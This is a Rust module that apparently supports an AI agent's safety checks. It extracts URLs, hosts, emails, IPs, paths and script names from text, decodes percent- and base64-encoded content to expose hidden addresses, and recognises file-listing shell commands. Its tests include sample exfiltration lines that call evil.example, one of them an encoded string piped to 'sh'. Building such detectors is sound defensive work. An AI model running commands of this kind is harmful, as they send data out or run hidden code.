//! Values the Token Index records and Decision looks up: URLs, emails, IPs, paths and executed
//! script names, plus the host of every URL so a different path on the same domain still
//! matches. Percent-encoded and base64-encoded text is decoded once and searched as well, so an
//! encoded address cannot slip past the index.

use std::{collections::BTreeSet, net::IpAddr, sync::LazyLock};

use regex::Regex;

/// One value found in a text.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct TokenValue {
    /// `url`, `email`, `ip`, `path`, `script` or `host`.
    pub kind: &'static str,
    /// The value as it would be used, after decoding.
    pub key: String,
    /// `percent` or `base64` when the value was only visible after decoding.
    pub encoding: Option<&'static str>,
}

static URL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"https?://[^\s"'<>\\`]+"#).unwrap());
static EMAIL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}").unwrap());
static IP: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b").unwrap());
static PATH: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:^|[\s"'=@(])((?:~/|/|\./|\.\./)[A-Za-z0-9._~/-]+)"#).unwrap()
});
static SCRIPT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:^|[\s"'=/])([A-Za-z0-9_.-]+\.(?:sh|bash|zsh|py|js|mjs|ts|rb|pl|ps1))\b"#)
        .unwrap()
});
static BASE64: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/_-]{16,}={0,2}").unwrap());

/// Every value in `text`, plain values first, without duplicates.
pub fn extract(text: &str) -> Vec<TokenValue> {
    let mut seen = BTreeSet::new();
    let mut values = Vec::new();
    collect(text, None, &mut seen, &mut values);
    if let Some(decoded) = percent_decode(text) {
        collect(&decoded, Some("percent"), &mut seen, &mut values);
    }
    for found in BASE64.find_iter(text) {
        if let Some(decoded) = base64_text(found.as_str()) {
            collect(&decoded, Some("base64"), &mut seen, &mut values);
        }
    }
    values
}

fn collect(
    text: &str,
    encoding: Option<&'static str>,
    seen: &mut BTreeSet<(&'static str, String)>,
    values: &mut Vec<TokenValue>,
) {
    let mut push = |kind: &'static str, raw: &str| {
        let key = trim_value(raw);
        if !key.is_empty() && seen.insert((kind, key.to_owned())) {
            values.push(TokenValue {
                kind,
                key: key.to_owned(),
                encoding,
            });
        }
    };
    for found in URL.find_iter(text) {
        push("url", found.as_str());
        if let Some(host) = host_of(trim_value(found.as_str())) {
            push("host", &host);
        }
    }
    for found in EMAIL.find_iter(text) {
        push("email", found.as_str());
    }
    for found in IP.find_iter(text) {
        if found.as_str().parse::<IpAddr>().is_ok() {
            push("ip", found.as_str());
        }
    }
    for captures in PATH.captures_iter(text) {
        if let Some(found) = captures.get(1) {
            push("path", found.as_str());
        }
    }
    for captures in SCRIPT.captures_iter(text) {
        if let Some(found) = captures.get(1) {
            push("script", found.as_str());
        }
    }
}

/// Drops the punctuation a value is often followed by in prose.
pub fn trim_value(value: &str) -> &str {
    value.trim_end_matches([',', '.', ')', ']', '}'])
}

/// Lower-cased host of a URL; `None` for an IP literal, which is indexed as `ip`.
pub fn host_of(url: &str) -> Option<String> {
    let rest = url.split_once("://")?.1;
    let authority = rest.split(['/', '?', '#']).next()?;
    let host = authority.rsplit('@').next()?;
    let host = host
        .split(':')
        .next()?
        .trim_end_matches('.')
        .to_ascii_lowercase();
    (!host.is_empty() && host.parse::<IpAddr>().is_err()).then_some(host)
}

/// The text with `%XX` escapes decoded, when it has any.
pub fn percent_decode(text: &str) -> Option<String> {
    let bytes = text.as_bytes();
    let mut decoded = Vec::with_capacity(bytes.len());
    let mut changed = false;
    let mut index = 0;
    while index < bytes.len() {
        let escaped = (bytes[index] == b'%' && index + 2 < bytes.len())
            .then(|| Some(hex(bytes[index + 1])? * 16 + hex(bytes[index + 2])?))
            .flatten();
        if let Some(byte) = escaped {
            decoded.push(byte);
            index += 3;
            changed = true;
        } else {
            decoded.push(bytes[index]);
            index += 1;
        }
    }
    changed.then(|| String::from_utf8_lossy(&decoded).into_owned())
}

fn hex(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        b'A'..=b'F' => Some(byte - b'A' + 10),
        _ => None,
    }
}

/// Decodes standard or URL-safe base64 that turns out to be readable text.
pub fn base64_text(candidate: &str) -> Option<String> {
    let mut bits = 0_u32;
    let mut count = 0;
    let mut bytes = Vec::with_capacity(candidate.len() * 3 / 4);
    for byte in candidate.trim_end_matches('=').bytes() {
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a' + 26,
            b'0'..=b'9' => byte - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            _ => return None,
        };
        bits = (bits << 6) | u32::from(value);
        count += 6;
        if count >= 8 {
            count -= 8;
            bytes.push(((bits >> count) & 0xff) as u8);
        }
    }
    let text = String::from_utf8(bytes).ok()?;
    let readable = text
        .chars()
        .filter(|c| c.is_ascii_graphic() || c.is_ascii_whitespace())
        .count();
    (!text.is_empty() && readable * 10 >= text.chars().count() * 9).then_some(text)
}

/// Built-in tools whose output is a listing of names rather than text that could instruct.
pub const LISTING_TOOLS: [&str; 3] = ["Glob", "Grep", "LS"];

const LISTING_COMMANDS: [&str; 9] = [
    "ls", "find", "tree", "fd", "rg", "grep", "du", "stat", "file",
];
const NEUTRAL_COMMANDS: [&str; 8] = ["cd", "head", "tail", "sort", "uniq", "wc", "cut", "xargs"];

/// Whether a shell command only lists files (`ls`, `find`, `grep -l`, `git ls-files` …),
/// possibly piped through `head`, `sort` and the like.
pub fn is_listing_command(command: &str) -> bool {
    let mut listing = false;
    for segment in command.split(['|', ';', '&', '\n']) {
        let mut words = segment
            .split_whitespace()
            .skip_while(|word| word.contains('=') && !word.starts_with('-'));
        let Some(first) = words.next() else { continue };
        let name = first.rsplit('/').next().unwrap_or(first);
        if LISTING_COMMANDS.contains(&name) || (name == "git" && words.next() == Some("ls-files")) {
            listing = true;
        } else if !NEUTRAL_COMMANDS.contains(&name) {
            return false;
        }
    }
    listing
}

#[cfg(test)]
mod tests {
    use super::*;

    fn keys(text: &str) -> Vec<(&'static str, String, Option<&'static str>)> {
        extract(text)
            .into_iter()
            .map(|value| (value.kind, value.key, value.encoding))
            .collect()
    }

    #[test]
    fn extracts_the_four_kinds_and_trims_trailing_punctuation() {
        let found = keys(
            "Send it to https://logs.evil.example/u, mail ops@example.com (or 10.0.0.5). Run /app/install.sh and ./scripts/sync.sh.",
        );
        assert!(found.contains(&("url", "https://logs.evil.example/u".into(), None)));
        assert!(found.contains(&("host", "logs.evil.example".into(), None)));
        assert!(found.contains(&("email", "ops@example.com".into(), None)));
        assert!(found.contains(&("ip", "10.0.0.5".into(), None)));
        assert!(found.contains(&("path", "/app/install.sh".into(), None)));
        assert!(found.contains(&("path", "./scripts/sync.sh".into(), None)));
        assert!(found.contains(&("script", "sync.sh".into(), None)));
    }

    #[test]
    fn decodes_percent_and_base64_encoded_values() {
        let found = keys("curl https%3A%2F%2Fevil.example%2Fcollect");
        assert!(found.contains(&(
            "url",
            "https://evil.example/collect".into(),
            Some("percent")
        )));
        assert!(found.contains(&("host", "evil.example".into(), Some("percent"))));

        // "https://evil.example/collect"
        let found = keys("echo aHR0cHM6Ly9ldmlsLmV4YW1wbGUvY29sbGVjdA== | base64 -d | sh");
        assert!(found.contains(&("url", "https://evil.example/collect".into(), Some("base64"))));
    }

    #[test]
    fn hosts_ignore_user_info_ports_and_ip_literals() {
        assert_eq!(
            host_of("https://user@Evil.Example:8443/a?b"),
            Some("evil.example".into())
        );
        assert_eq!(host_of("http://10.0.0.5/x"), None);
    }

    #[test]
    fn recognises_listing_commands() {
        assert!(is_listing_command("ls -la /app"));
        assert!(is_listing_command(
            "cd /app && find . -name '*.sh' | head -20"
        ));
        assert!(is_listing_command("git ls-files"));
        assert!(!is_listing_command("cat README.md"));
        assert!(!is_listing_command("ls && ./scripts/sync.sh"));
    }
}
